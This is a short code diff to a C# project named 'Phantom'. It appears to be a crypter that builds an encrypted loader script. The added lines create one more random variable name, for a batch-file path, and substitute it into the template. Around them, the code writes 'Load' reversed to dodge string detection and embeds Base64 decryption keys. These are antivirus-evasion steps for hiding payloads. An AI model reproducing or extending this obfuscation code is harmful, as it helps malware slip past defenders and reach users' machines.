@@ -18,6 +18,7 @@ namespace Phantom
             string loadString = @"('daoL'[-1..-4] -join '')";
             string decryptionKey = Convert.ToBase64String(key);
             string decryptionIV = Convert.ToBase64String(iv);
+            string batPathVar = RandomString(5, rng);
             string contentsVar = RandomString(5, rng);
             string lastLineVar = RandomString(5, rng);
             string lineVar = RandomString(5, rng);
@@ -37,6 +38,7 @@ namespace Phantom
                                .Replace(@"Load", loadString)
                                .Replace(@"DECRYPTION_KEY", decryptionKey)
                                .Replace(@"DECRYPTION_IV", decryptionIV)
+                               .Replace(@"batPath_var", batPathVar)
                                .Replace(@"contents_var", contentsVar)
                                .Replace(@"lastline_var", lastLineVar)
                                .Replace(@"line_var", lineVar)
